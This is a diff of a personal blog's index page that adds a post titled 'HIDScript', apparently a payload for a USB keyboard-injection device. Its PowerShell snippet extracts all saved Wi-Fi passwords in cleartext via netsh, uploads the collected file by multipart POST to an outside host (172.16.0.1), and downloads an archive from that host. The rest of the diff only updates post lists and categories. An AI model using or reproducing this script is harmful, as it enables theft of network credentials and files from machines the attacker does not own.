@@ -9,8 +9,29 @@
   <meta name="author" content="icps">
 
   
-  <meta name="description" content="Set-PSReadlineOption -BellStyle Visual
-">
+  <meta name="description" content="1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+## uploadFiles $FilePath=&quot;C:/Windows/Temp/files.zip&quot;
+$Url=&quot;http://172.16.0.1/& &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -69,6 +90,78 @@
       <div class="blog-index">
   
 
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2021/04/01/hidscript/">HIDScript</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2021-04-01T16:41:26+08:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2021</span></span> <span class='time'>4:41 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='powershell'><span class='line'><span class="c">## uploadFiles</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$FilePath</span><span class="p">=</span><span class="s2">&quot;C:/Windows/Temp/files.zip&quot;</span>
+</span><span class='line'><span class="nv">$Url</span><span class="p">=</span><span class="s2">&quot;http://172.16.0.1/&quot;</span>
+</span><span class='line'><span class="nv">$fileName</span><span class="p">=</span><span class="no">[System.IO.Path]</span><span class="p">::</span><span class="n">GetFileName</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">)</span>
+</span><span class='line'><span class="nv">$fileBytes</span><span class="p">=(</span><span class="no">[System.IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$FilePath</span><span class="p">))</span>
+</span><span class='line'><span class="nv">$fileEnc</span><span class="p">=</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">GetEncoding</span><span class="p">(</span><span class="s2">&quot;iso-8859-1&quot;</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$fileBytes</span><span class="p">)</span>
+</span><span class='line'><span class="nv">$boundary</span><span class="p">=</span><span class="no">[System.Guid]</span><span class="p">::</span><span class="n">NewGuid</span><span class="p">().</span><span class="n">ToString</span><span class="p">()</span>
+</span><span class='line'><span class="nv">$lf</span><span class="p">=</span><span class="s2">&quot;</span><span class="se">`r`n</span><span class="s2">&quot;</span>
+</span><span class='line'><span class="nv">$bodyLines</span><span class="p">=(</span><span class="s2">&quot;--$boundary&quot;</span><span class="p">,</span><span class="s2">&quot;Content-Disposition: form-data; name=</span><span class="se">`&quot;</span><span class="s2">uploads</span><span class="se">`&quot;</span><span class="s2">; filename=</span><span class="se">`&quot;</span><span class="s2">$FileName</span><span class="se">`&quot;</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;Content-Type: application/octet-stream$lf&quot;</span><span class="p">,</span><span class="nv">$fileEnc</span><span class="p">,</span><span class="s2">&quot;--$boundary--$lf&quot;</span><span class="p">)</span> <span class="n">-join</span> <span class="nv">$lf</span>
+</span><span class='line'><span class="nb">Invoke-RestMethod</span> <span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Method</span> <span class="n">Post</span> <span class="n">-ContentType</span> <span class="s2">&quot;multipart/form-data; boundary=</span><span class="se">`&quot;</span><span class="s2">$boundary</span><span class="se">`&quot;</span><span class="s2">&quot;</span> <span class="n">-Body</span> <span class="nv">$bodyLines</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="c">## getWiFiPassWd</span>
+</span><span class='line'><span class="nv">$ws</span><span class="p">=(</span><span class="n">netsh</span> <span class="n">wlan</span> <span class="n">show</span> <span class="n">profiles</span><span class="p">)</span> <span class="o">-match</span> <span class="s2">&quot; : &quot;</span><span class="p">;</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$s</span> <span class="k">in</span> <span class="nv">$ws</span><span class="p">){</span><span class="n">echo</span> <span class="nv">$s</span><span class="p">;</span><span class="nv">$ssid</span><span class="p">=</span><span class="nv">$s</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="n">1</span><span class="p">].</span><span class="n">Trim</span><span class="p">();</span><span class="nv">$pw</span><span class="p">=(</span><span class="n">netsh</span> <span class="n">wlan</span> <span class="n">show</span> <span class="n">profiles</span> <span class="n">name</span><span class="p">=</span><span class="nv">$ssid</span> <span class="n">key</span><span class="p">=</span><span class="n">clear</span><span class="p">);</span><span class="nv">$c</span><span class="p">=</span><span class="n">0</span><span class="p">;</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$p</span> <span class="k">in</span> <span class="nv">$pw</span><span class="p">){;</span><span class="k">if</span><span class="p">(</span><span class="nv">$c</span> <span class="o">-eq</span> <span class="s2">&quot;32&quot;</span><span class="p">){</span><span class="nv">$pass</span><span class="p">=</span><span class="nv">$p</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="n">1</span><span class="p">].</span><span class="n">Trim</span><span class="p">();}</span><span class="nv">$c</span><span class="p">+=</span><span class="n">1</span><span class="p">}</span><span class="n">echo</span> <span class="s2">&quot;$ssid $pass&quot;</span> <span class="p">&gt;&gt;</span> <span class="nv">$FilePath</span><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">## downloadFiles</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$Source</span><span class="p">=</span><span class="s2">&quot;http://172.16.0.1/uploads/dFiles.7z&quot;</span>
+</span><span class='line'><span class="nv">$Destination</span><span class="p">=</span><span class="s2">&quot;C:/Windows/Temp/dFiles.7z&quot;</span>
+</span><span class='line'><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$Source</span> <span class="n">-OutFile</span> <span class="nv">$Destination</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
   
     <article>
       
@@ -254,35 +347,6 @@
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2020/10/01/convert/">Convert</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2020-10-01T17:03:54+08:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2020</span></span> <span class='time'>5:03 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>convert [path] -trim +repage -quality 80 -resize &lsquo;800x600&rsquo; -gravity center -background transparent -extent 800x600 [path]</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
     <a href="/blog/archives">Blog Archives</a>
@@ -303,6 +367,7 @@
 <li class='category'><a href='/blog/categories/golang/'>golang (7)</a></li>
 <li class='category'><a href='/blog/categories/juniper/'>juniper (1)</a></li>
 <li class='category'><a href='/blog/categories/linux/'>linux (33)</a></li>
+<li class='category'><a href='/blog/categories/powershell/'>powershell (1)</a></li>
 <li class='category'><a href='/blog/categories/python/'>python (10)</a></li>
 <li class='category'><a href='/blog/categories/ror/'>ror (35)</a></li>
 <li class='category'><a href='/blog/categories/ruby/'>ruby (59)</a></li>
@@ -314,6 +379,10 @@
 <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2021/04/01/hidscript/">HIDScript</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2021/03/25/cmd-beep-sound/">Cmd_beep_sound</a>
@@ -329,10 +398,6 @@
     
       <li class="post">
         <a href="/blog/2020/11/05/imagemagick/">imageMagick</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2020/10/01/convert/">Convert</a>
       </li>
     
   </ul>
